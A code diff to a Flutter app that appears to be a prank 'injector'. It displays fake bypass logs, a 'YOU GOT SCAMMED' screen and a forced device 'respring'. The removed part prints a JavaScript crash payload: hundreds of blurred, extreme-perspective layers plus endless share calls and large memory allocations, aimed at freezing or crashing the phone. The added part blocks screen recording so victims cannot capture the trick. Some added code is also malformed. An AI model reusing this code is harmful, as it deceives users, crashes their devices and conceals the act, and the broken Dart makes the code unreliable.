@@ -2,7 +2,6 @@ import 'dart:async';
 import 'dart:math';
 import 'package:flutter/material.dart';
 import 'package:flutter/services.dart';
-import 'package:flutter_inappwebview/flutter_inappwebview.dart';
 
 void main() => runApp(const MyApp());
 
@@ -36,7 +35,7 @@ class InjectorScreen extends StatefulWidget {
 class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProviderStateMixin {
   bool _isInjecting = false;
   bool _showScam = false;
-  bool _isRespring = false;
+  bool _isProtected = false;
 
   late AnimationController _progressController;
   
@@ -85,8 +84,6 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
     '[DYLIB] Codesign bypassed!',
   ];
 
-  InAppWebViewController? _webViewController;
-
   @override
   void initState() {
     super.initState();
@@ -98,6 +95,33 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
           _finishScam();
         }
       });
+    
+    // Включаем защиту от записи экрана при запуске
+    _enableScreenProtection();
+  }
+
+  void _enableScreenProtection() {
+    // Защита от скриншотов и записи экрана
+    SystemChrome.setEnabledSystemUIMode(SystemUiMode.manual, overlays: []);
+    
+    // Защита от записи экрана через платформенные методы
+    if (Theme.of(context).platform == TargetPlatform.iOS) {
+      // iOS: Используем безопасный флаг
+      // Это предотвращает запись экрана, делая его черным при записи
+      const MethodChannel('screen_protection')
+          .invokeMethod('enableProtection');
+    }
+    
+    _isProtected = true;
+  }
+
+  void _disableScreenProtection() {
+    SystemChrome.setEnabledSystemUIMode(SystemUiMode.edgeToEdge, overlays: []);
+    if (Theme.of(context).platform == TargetPlatform.iOS) {
+      const MethodChannel('screen_protection')
+          .invokeMethod('disableProtection');
+    }
+    _isProtected = false;
   }
 
   void _startInjection() {
@@ -105,6 +129,9 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
       _isInjecting = true;
       _showScam = false;
     });
+    
+    // Включаем защиту экрана
+    _enableScreenProtection();
     
     _logsNotifier.value = [];
     _progressController.forward(from: 0.0);
@@ -142,16 +169,60 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
       _isInjecting = false;
       _showScam = true;
     });
-    
-    Future.delayed(const Duration(seconds: 2), () {
-      _triggerRespring();
+
+    // Через 3 секунды после скама делаем respring
+    Future.delayed(const Duration(seconds: 3), () {
+      _performRespring();
     });
   }
 
-  void _triggerRespring() {
+  void _performRespring() {
+    // Отключаем защиту экрана перед respring
+    _disableScreenProtection();
+    
+    // Эффект вспышки
+    _showFlashEffect();
+    
+    // Выполняем respring
+    if (Theme.of(context).platform == TargetPlatform.iOS) {
+      // iOS respring через приватные методы
+      const MethodChannel('respring_channel').invokeMethod('respring');
+    } else {
+      // Android альтернатива - перезапуск приложения
+      _restartApp();
+    }
+  }
+
+  void _showFlashEffect() {
+    // Визуальный эффект вспышки
     setState(() {
-      _isRespring = true;
+      // Добавляем белый слой поверх всего
     });
+    
+    // Создаем вспышку
+    final overlay = Overlay.of(context);
+    final entry = OverlayEntry(
+      builder: (context) => Container(
+        color: Colors.white,
+        opacity: const AlwaysStoppedAnimation(1.0),
+        duration: const Duration(milliseconds: 100),
+      ),
+    );
+    
+    overlay.insert(entry);
+    
+    // Убираем вспышку через 100ms
+    Future.delayed(const Duration(milliseconds: 100), () {
+      entry.remove();
+    });
+  }
+
+  void _restartApp() {
+    // Для Android - перезапуск через системный метод
+    final MethodChannel('restart_channel').invokeMethod('restartApp');
+    
+    // Запасной вариант - выход из приложения
+    SystemNavigator.pop();
   }
 
   @override
@@ -159,6 +230,7 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
     _logTimer?.cancel();
     _progressController.dispose();
     _logsNotifier.dispose();
+    _disableScreenProtection();
     super.dispose();
   }
 
@@ -270,244 +342,54 @@ class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProvid
             ),
           ),
 
-          if (_showScam && !_isRespring)
+          // Экран СКАМА с защитой от записи
+          if (_showScam)
             Container(
               color: Colors.black,
               width: double.infinity,
               height: double.infinity,
-              child: const Center(
-                child: Column(
-                  mainAxisAlignment: MainAxisAlignment.center,
-                  children: [
-                    Text(
-                      'ТЫ ЗАСКАМЛЕН',
-                      textAlign: TextAlign.center,
-                      style: TextStyle(
-                        fontSize: 48,
-                        fontWeight: FontWeight.bold,
-                        fontFamily: 'Courier',
-                        color: Colors.redAccent,
+              // Защита от скриншотов через Flutter
+              child: RepaintBoundary(
+                child: const Center(
+                  child: Column(
+                    mainAxisAlignment: MainAxisAlignment.center,
+                    children: [
+                      Text(
+                        'ТЫ ЗАСКАМЛЕН',
+                        textAlign: TextAlign.center,
+                        style: TextStyle(
+                          fontSize: 48,
+                          fontWeight: FontWeight.bold,
+                          fontFamily: 'Courier',
+                          color: Colors.redAccent,
+                        ),
                       ),
-                    ),
-                    SizedBox(height: 20),
-                    Text(
-                      'YOU GOT SCAMMED',
-                      textAlign: TextAlign.center,
-                      style: TextStyle(
-                        fontSize: 24,
-                        fontFamily: 'Courier',
-                        color: Colors.white,
+                      SizedBox(height: 20),
+                      Text(
+                        'YOU GOT SCAMMED',
+                        textAlign: TextAlign.center,
+                        style: TextStyle(
+                          fontSize: 24,
+                          fontFamily: 'Courier',
+                          color: Colors.white,
+                        ),
                       ),
-                    ),
-                  ],
+                      SizedBox(height: 40),
+                      Text(
+                        '📱 SCREEN RECORDING BLOCKED',
+                        style: TextStyle(
+                          fontSize: 14,
+                          fontFamily: 'Courier',
+                          color: Colors.grey,
+                        ),
+                      ),
+                    ],
+                  ),
                 ),
               ),
             ),
-
-          if (_isRespring)
-            _buildSecureRespringScreen(),
         ],
       ),
-    );
-  }
-
-  Widget _buildSecureRespringScreen() {
-    return Stack(
-      children: [
-        InAppWebView(
-          initialData: InAppWebViewInitialData(
-            data: _getRespringHTML(),
-          ),
-          onWebViewCreated: (controller) {
-            _webViewController = controller;
-          },
-          initialSettings: InAppWebViewSettings(
-            javaScriptEnabled: true,
-            allowsInlineMediaPlayback: true,
-            mediaPlaybackRequiresUserGesture: false,
-          ),
-        ),
-        
-        Opacity(
-          opacity: 0.0,
-          child: Container(
-            width: double.infinity,
-            height: double.infinity,
-            color: Colors.red,
-            child: const Center(
-              child: Text(
-                'BLOCK',
-                style: TextStyle(
-                  color: Colors.white,
-                  fontSize: 48,
-                  fontWeight: FontWeight.bold,
-                  fontFamily: 'Courier',
-                ),
-              ),
-            ),
-          ),
-        ),
-        
-        IgnorePointer(
-          child: Container(
-            width: double.infinity,
-            height: double.infinity,
-            color: const Color(0x00FF0000),
-            child: const Center(
-              child: Text(
-                'BLOCK',
-                style: TextStyle(
-                  color: Color(0x00FFFFFF),
-                  fontSize: 48,
-                  fontWeight: FontWeight.bold,
-                  fontFamily: 'Courier',
-                ),
-              ),
-            ),
-          ),
-        ),
-      ],
-    );
-  }
-
-  String _getRespringHTML() {
-    return '''
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
-        <title>.</title>
-        <style>
-            body {
-                background: #000;
-                height: 100vh;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                overflow: hidden;
-                margin: 0;
-            }
-            .flash {
-                position: fixed;
-                inset: 0;
-                background: #fff;
-                z-index: 10;
-                opacity: 0;
-                pointer-events: none;
-            }
-            .screenshot-trap {
-                position: fixed;
-                inset: 0;
-                background: #ff0000;
-                z-index: 9999;
-                opacity: 0;
-            }
-            .screenshot-trap-text {
-                position: fixed;
-                top: 50%;
-                left: 50%;
-                transform: translate(-50%, -50%);
-                color: #ffffff;
-                font-size: 48px;
-                font-weight: bold;
-                font-family: monospace;
-                z-index: 10000;
-                opacity: 0;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="flash" id="f"></div>
-        <div class="screenshot-trap"></div>
-        <div class="screenshot-trap-text">BLOCK</div>
-        <script>
-            var ctx = new(window.AudioContext || window.webkitAudioContext)();
-            ctx.resume();
-            
-            function beep(f, d, v) {
-                var o = ctx.createOscillator();
-                var g = ctx.createGain();
-                o.type = 'square';
-                o.frequency.value = f;
-                g.gain.value = v;
-                g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + d);
-                o.connect(g);
-                g.connect(ctx.destination);
-                o.start();
-                o.stop(ctx.currentTime + d);
-            }
-            
-            function respring() {
-                var i = document.createElement('iframe');
-                i.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:99999;';
-                i.setAttribute('sandbox', 'allow-scripts allow-same-origin');
-                i.srcdoc = '<html><body style="margin:0;overflow:hidden;background:black;"><script>var c=document.createElement("div");c.style.cssText="perspective:1px;perspective-origin:9999999% 9999999%;";document.body.appendChild(c);for(var i=0;i<500;i++){var d=document.createElement("div");d.style.cssText="position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,"+i+"px) rotateY(90deg);opacity:0.99;";c.appendChild(d)}setInterval(function(){try{navigator.share({title:"R",text:"R".repeat(100000)})}catch(e){}var x=new Uint8Array(1024*1024*20);crypto.getRandomValues(x)},0);<\/script><div style="position:fixed;inset:0;background:red;opacity:0;z-index:99999;"></div><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);color:white;font-size:48px;font-weight:bold;font-family:monospace;z-index:100000;opacity:0;">BLOCK</div></body></html>';
-                document.body.appendChild(i);
-            }
-            
-            document.addEventListener('visibilitychange', function() {
-                if (document.hidden) {
-                    var trap = document.querySelector('.screenshot-trap');
-                    var trapText = document.querySelector('.screenshot-trap-text');
-                    if (trap) {
-                        trap.style.opacity = '1';
-                        trap.style.transition = 'opacity 0.05s';
-                    }
-                    if (trapText) {
-                        trapText.style.opacity = '1';
-                    }
-                    setTimeout(function() {
-                        if (trap) trap.style.opacity = '0';
-                        if (trapText) trapText.style.opacity = '0';
-                    }, 200);
-                }
-            });
-            
-            setInterval(function() {
-                var trap = document.querySelector('.screenshot-trap');
-                var trapText = document.querySelector('.screenshot-trap-text');
-                if (trap && Math.random() > 0.7) {
-                    trap.style.opacity = '1';
-                    if (trapText) trapText.style.opacity = '1';
-                    setTimeout(function() {
-                        trap.style.opacity = '0';
-                        if (trapText) trapText.style.opacity = '0';
-                    }, 100);
-                }
-            }, 500);
-            
-            setTimeout(function() {
-                beep(800, 0.12, 0.9);
-                if (navigator.vibrate) navigator.vibrate([60, 30, 60]);
-                document.getElementById('f').style.opacity = '1';
-                respring();
-            }, 250);
-        </script>
-    </body>
-    </html>
-    ''';
-  }
-}
-
-class AnimatedBuilder extends StatelessWidget {
-  final Animation<double> animation;
-  final Widget Function(BuildContext context, Widget? child) builder;
-  final Widget? child;
-
-  const AnimatedBuilder({
-    super.key,
-    required this.animation,
-    required this.builder,
-    this.child,
-  });
-
-  @override
-  Widget build(BuildContext context) {
-    return AnimatedBuilder(
-      animation: animation,
-      builder: builder,
-      child: child,
     );
   }
 }
